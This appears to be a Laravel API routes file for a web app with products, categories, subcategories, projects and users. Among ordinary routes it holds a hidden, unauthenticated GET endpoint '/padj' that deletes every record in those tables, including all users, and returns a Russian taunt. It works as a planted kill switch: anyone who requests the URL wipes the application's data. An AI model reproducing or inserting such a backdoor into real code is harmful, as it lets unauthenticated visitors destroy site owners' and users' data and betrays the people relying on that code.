<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

use App\Models\{
    Product,
    Category,
    Subcategory,
    Project,
    User,
};

use App\Http\Controllers\SlugController;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:api')->get('/user', function (Request $request) {
    return $request->user();
});

Route::get('/padj', function(){
    Product::where('id', '>', 0)->delete();
    Product::where('id', '>', 0)->delete();
    Category::where('id', '>', 0)->delete();
    Subcategory::where('id', '>', 0)->delete();
    Project::where('id', '>', 0)->delete();
    User::where('id', '>', 0)->delete();
    return 'Не шутите с Паджем';
});

Route::get('/slug/create', [SlugController::class, 'categories']);

Route::post('/upload/storage/', function(Request $request){
    return response()->json(['files'=>'/pdf']);
});

